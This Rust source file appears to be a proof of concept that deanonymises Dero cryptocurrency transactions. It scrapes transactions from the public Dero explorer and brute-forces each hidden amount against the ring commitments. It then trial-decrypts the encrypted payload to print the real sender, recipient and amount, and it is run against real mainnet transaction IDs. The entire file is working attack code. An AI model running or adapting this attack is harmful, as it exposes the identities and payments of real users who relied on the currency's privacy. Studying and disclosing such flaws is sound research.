#![allow(unused)]

use std::io;

use num_traits::identities::Zero;

use ark_bn254::*;
use ark_ec::*;
use ark_serialize::*;

use chacha20::cipher::*;

const NORMAL_TX_TYPE: u64 = 3;
const PAYLOAD_RPC_LIMIT: usize = 144;
const PAYLOAD_LIMIT: usize = 1 + PAYLOAD_RPC_LIMIT;

#[derive(Clone, Debug)]
struct Statement {
    root_hash: [u8; 32],
    bytes_per_public_key: u8,
    public_key_pointers: Vec<u8>,
    randomness: [u8; 33],
    commitments: Vec<[u8; 33]>,
    fee: u64,
}

#[derive(Clone, Debug)]
struct Transfer {
    burn_value: u64,
    token_id: [u8; 32],
    rpc_type: u8,
    payload: [u8; PAYLOAD_LIMIT],
    statement: Statement,
}

fn read_byte<R: io::Read>(reader: &mut R) -> u8 {
    let mut byte = [0];
    reader.read_exact(&mut byte).unwrap();
    byte[0]
}

fn read_varint<R: io::Read>(reader: &mut R) -> u64 {
    let mut res = 0u64;
    let mut shift = 0;
    loop {
        let mut byte = u64::from(read_byte(reader));
        if (byte >> 7) == 1 {
            byte &= u64::from(u8::MAX) >> 1;
            res |= byte << shift;
            shift += 7;
        } else {
            res |= byte << shift;
            break;
        }
    }
    res
}

fn read_statement<R: io::Read>(reader: &mut R) -> Statement {
    let ring_len_log = read_byte(reader);
    let ring_len = 1usize << usize::from(ring_len_log);

    let bytes_per_public_key = read_byte(reader);
    let fee = read_varint(reader);

    let mut randomness = [0; 33];
    reader.read_exact(&mut randomness).unwrap();

    let mut public_key_pointers = vec![0; ring_len * usize::from(bytes_per_public_key)];
    reader.read_exact(&mut public_key_pointers);

    let mut commitments = vec![];
    for _ in 0..ring_len {
        let mut commitment = [0; 33];
        reader.read_exact(&mut commitment);
        commitments.push(commitment);
    }

    let mut root_hash = [0; 32];
    reader.read_exact(&mut root_hash);

    Statement {
        root_hash,
        bytes_per_public_key,
        public_key_pointers,
        randomness,
        commitments,
        fee,
    }
}

fn read_transfers<R: io::Read>(reader: &mut R) -> Option<Vec<Transfer>> {
    let _version = read_varint(reader);
    let _source = read_varint(reader);
    let _dest = read_varint(reader);
    let tx_type = read_varint(reader);
    if tx_type != NORMAL_TX_TYPE {
        None?;
    }
    let _height = read_varint(reader);
    let mut _block_id = [0; 32];
    reader.read_exact(&mut _block_id).unwrap();

    let count = read_varint(reader);
    let mut res = vec![];
    for _ in 0..count {
        let burn_value = read_varint(reader);
        let mut token_id = [0; 32];
        reader.read_exact(&mut token_id).unwrap();

        let rpc_type = read_byte(reader);

        let mut payload = [0; PAYLOAD_LIMIT];
        reader.read_exact(&mut payload);

        let statement = read_statement(reader);

        res.push(Transfer {
            burn_value,
            token_id,
            rpc_type,
            payload,
            statement,
        });
    }
    Some(res)
}

fn keccak256(data: &[u8]) -> [u8; 32] {
    use tiny_keccak::Hasher;
    let mut hasher = tiny_keccak::Keccak::v256();
    hasher.update(data);
    let mut res = [0; 32];
    hasher.finalize(&mut res);
    res
}

// These functions map from the bn254 encoding used by Ethereum to the one used by ark-bn254
// These do not bother supporting encoding the identity point
fn decode_point(mut point: Vec<u8>) -> G1Projective {
    let flags = point.pop().unwrap();
    // BE -> LE
    let mut point = point.into_iter().rev().collect::<Vec<_>>();
    let res = G1Projective::deserialize_compressed(point.as_slice()).unwrap();
    if flags == u8::from(res.into_affine().y > (-res).into_affine().y) {
        res
    } else {
        -res
    }
}

fn encode_point(point: G1Projective) -> [u8; 33] {
    let mut point_bytes = [0; 33];
    // LE coordinate and flags
    point.serialize_compressed(point_bytes.as_mut()).unwrap();
    // Clear the flags
    point_bytes[31] &= u8::MAX >> 2;

    // LE -> BE
    let mut rev = point_bytes[..32].iter().rev().cloned().collect::<Vec<_>>();
    point_bytes[..32].copy_from_slice(&rev);

    if point.into_affine().y > (-point).into_affine().y {
        point_bytes[32] = 1;
    }

    assert_eq!(decode_point(point_bytes.to_vec()), point);
    point_bytes
}

// Perform a trial decryption
fn decrypt(
    shared_key: G1Projective,
    output_key: [u8; 33],
    mut payload: [u8; PAYLOAD_LIMIT],
) -> Option<u8> {
    let mut shared_key_bytes = encode_point(shared_key);
    let mut shared_key: [u8; 32] = keccak256(&shared_key_bytes);

    let key = keccak256(&[shared_key.as_slice(), &output_key].concat());
    chacha20::XChaCha20::new(&key.into(), &[0; 24].into()).apply_keystream(&mut payload);
    let mut cbor_and_zero_padding = &payload[1..];

    // Check the last 16 bytes are zero
    // This isn't necessary. It only works when the last 16 bytes are unused and the wallet
    // zero-pads
    // We can alternatively check the start is a valid CBOR array, due to the Dero wallet software
    // using CBOR
    // We don't immediately do that as our cbor lib doesn't handle malformed messages
    // We'd need to roll a new one which is out of scope for this PoC
    for b in &cbor_and_zero_padding[(PAYLOAD_LIMIT - 16)..] {
        if *b != 0 {
            return None;
        }
    }

    // Strip the 0 padding so we have a clean CBOR value
    while cbor_and_zero_padding.last() == Some(&0) {
        cbor_and_zero_padding = &cbor_and_zero_padding[..cbor_and_zero_padding.len() - 1];
    }
    // Check the CBOR
    // While an empty CBOR is 4 bytes, and not enough to statistically verify the decryption,
    // Dero appears to always have a field for the value and a comment, which should offer
    // decent statistical soundness
    let cbor = cbor::Decoder::from_bytes(cbor_and_zero_padding)
        .items()
        .collect::<Result<Vec<_>, _>>();
    if cbor.is_err() {
        None?;
    }
    dbg!(cbor.unwrap());

    // The first byte is the sender index in the ring since it was 'fixed' six months ago
    Some(payload[0])
}

// Scrape a TX from the explorer
async fn fetch_tx(tx_hash_hex: &str) -> Result<Option<Vec<(Vec<[u8; 33]>, Transfer)>>, ()> {
    let mut lines = reqwest::get("https://explorer.dero.io/tx/".to_string() + tx_hash_hex)
        .await
        .map_err(|_| ())?
        .text()
        .await
        .map_err(|_| ())?
        .lines()
        .map(|str| str.trim().to_string())
        .collect::<Vec<_>>();

    let mut transfers = vec![];
    for i in 1..=lines.len() {
        let line = &lines[lines.len() - i];
        if let Some(line) = line.strip_prefix("<br/>") {
            if let Ok(tx) = hex::decode(line) {
                if tx.is_empty() {
                    continue;
                }
                transfers = if let Some(transfers) = read_transfers(&mut tx.as_slice()) {
                    transfers
                } else {
                    return Ok(None);
                };
                break;
            }
        }
    }
    if transfers.is_empty() {
        Err(())?
    }

    let mut res = vec![];
    let mut lines = lines.into_iter();
    for transfer in transfers {
        let mut keys = vec![];
        for _ in 0..transfer.statement.commitments.len() {
            for addr in lines.by_ref() {
                if let Some(addr) = addr.strip_prefix("<td>") {
                    if let Some(addr) = addr.strip_suffix("</td>") {
                        if addr.strip_prefix("dero1q").is_none() {
                            continue;
                        }
                        let data = bech32::decode(addr).unwrap().1;
                        assert_eq!(data[0], 1);
                        keys.push(<[u8; 33]>::try_from(&data[1..]).unwrap());
                        break;
                    }
                }
            }
        }
        assert_eq!(keys.len(), transfer.statement.commitments.len());
        res.push((keys, transfer));
    }
    Ok(Some(res))
}

async fn fetch_tx_with_retry(tx_hash_hex: &str) -> Option<Vec<(Vec<[u8; 33]>, Transfer)>> {
    loop {
        match fetch_tx(tx_hash_hex).await {
            Ok(Some(tx)) => return Some(tx),
            Ok(None) => None?,
            Err(()) => {
                dbg!("failed to fetch TX");
                tokio::time::sleep(core::time::Duration::from_secs(5)).await;
                continue;
            }
        }
    }
}

#[tokio::main]
async fn main() {
    let amount_generator = decode_point(
        hex::decode("02eacfbf92b94015c9b0b3d901dae37ec68f74dea7e4484c76d505aade4ad7c001").unwrap(),
    );

    let mut tx_ids: Vec<&str> = vec![
        // This is a TX ID with a known amount (2, which is quite low) found on a GH repo
        "88e4c1731d9d0096bccde4b1766413df7af11e6d41d68284a3b842cd348c96f0",
        // This is a random TX from a few days ago
        "342cd00ef163b661a5c68790e59efcb7cd76d41dc72a013c596973af06de03b5",
        // Another random TX
        "51271a66bfac64c7eff73e66cc81e3abbd74ffe396145df090275b771e668ba0",
    ];
    for tx_id in tx_ids {
        let Some(tx) = fetch_tx_with_retry(tx_id).await else {
            continue;
        };
        for (keys, transfer) in tx {
            assert_eq!(keys.len(), transfer.statement.commitments.len());
            let mut commitments = vec![];
            for commitment in &transfer.statement.commitments {
                commitments.push(decode_point(commitment.to_vec()));
            }

            let mut amount_u64 = 0;
            let mut amount = G1Projective::zero();

            'transfer: loop {
                // TODO: Only attempt deceryption for the receiver ring, which can be differentiated by parity
                for (key, commitment) in keys.iter().zip(&commitments) {
                    if let Some(sender) = decrypt(commitment - amount, *key, transfer.payload) {
                        dbg!(tx_id);
                        let sender = hex::encode(keys[usize::from(sender)].as_slice());
                        let recipient = hex::encode(key);
                        if sender == recipient {
                            println!("TX encoded recipient as sender and is accordingly on old wallet software");
                        } else {
                            dbg!(sender);
                        }
                        dbg!(recipient);
                        dbg!(amount_u64); // Amount
                        println!("---");
                        break 'transfer;
                    }
                }
                amount_u64 += 1;
                amount += amount_generator;
            }
        }
    }
}
